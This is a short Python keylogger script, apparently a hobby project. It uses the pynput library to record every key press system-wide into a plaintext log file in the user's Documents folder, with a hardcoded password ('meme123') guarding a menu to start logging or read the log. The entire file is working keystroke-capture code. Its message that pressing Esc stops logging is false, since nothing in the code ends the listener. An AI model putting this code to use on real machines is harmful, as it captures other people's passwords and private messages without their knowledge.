from pynput.keyboard import Key, Listener
import os

log_file_path = os.path.join(os.path.expanduser("~"), "Documents", "log.txt")

def log_key(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key.startswith("Key."):
        key = ""
    
    try:
        with open(log_file_path, 'a') as log_file:
            log_file.write(key)
    except PermissionError:
        print(f"Permission denied: {log_file_path}. Check file permissions.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def start_logging():
    with Listener(on_press=log_key) as listener:
        listener.join()

def read_keylog():
    try:
        with open(log_file_path, "r") as log_file:
            return log_file.read()
    except FileNotFoundError:
        return "Log file not found"

def check_password():
    password = input("Enter password: ").strip()
    return password == "meme123"

if __name__ == "__main__":
    if not check_password():
        print("Incorrect password. Exiting...")
    else:
        action = input("Enter 'start' to start logging or 'read' to view logs: ").strip().lower()
        if action == "start":
            print("Keylogger Started... (Press 'Esc' to stop)")
            start_logging()
        elif action == "read":
            print(read_keylog())
        else:
            print("Invalid action")